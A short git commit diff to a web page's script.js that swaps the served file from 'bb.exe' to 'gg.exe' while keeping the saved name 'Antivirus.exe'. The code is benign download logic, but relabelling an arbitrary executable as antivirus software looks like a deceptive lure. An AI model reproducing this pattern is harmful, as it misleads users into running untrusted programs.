41536e5458dcac91f72ed9e00922041bc809e248
prog-ammar <ammarofc2005@gmail.com>
2024-11-24 21:09:43 +0500

    Update script.js
    updated script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 document.getElementById('download-btn').addEventListener('click', () => {
-    const fileUrl = 'bb.exe'; // Replace with the actual file path
+    const fileUrl = 'gg.exe'; // Replace with the actual file path
     const anchor = document.createElement('a');
     anchor.href = fileUrl;
     anchor.download = 'Antivirus.exe'; // The file name for download
